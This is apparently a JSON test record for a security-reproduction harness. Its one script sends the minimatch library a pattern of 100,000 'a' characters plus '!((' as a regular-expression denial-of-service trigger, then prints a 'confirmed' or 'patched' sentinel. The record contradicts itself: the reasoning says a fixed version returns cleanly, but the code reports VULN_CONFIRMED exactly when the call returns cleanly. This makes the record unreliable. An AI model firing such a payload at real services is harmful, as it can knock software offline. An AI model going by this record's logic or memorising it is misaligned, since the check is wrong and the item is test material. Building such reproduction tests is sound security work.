content.text: {"files": {"trigger.js": "const m = require('minimatch'); try { m('', 'a'.repeat(1e5)+'!(('); process.stdout.write('VULN_CONFIRMED\n'); process.exit(0);} catch(e){ process.stdout.write('PATCHED_OK\n'); process.exit(0);} "}, "trigger_cmd": ["node", "trigger.js"], "sentinel_confirmed": "VULN_CONFIRMED", "expected_confirmed_exit": 0, "sentinel_patched": "PATCHED_OK", "expected_patched_exit": 0, "reasoning": "Differential ReDoS trigger; affected version hangs/throws, fixed version returns cleanly."}
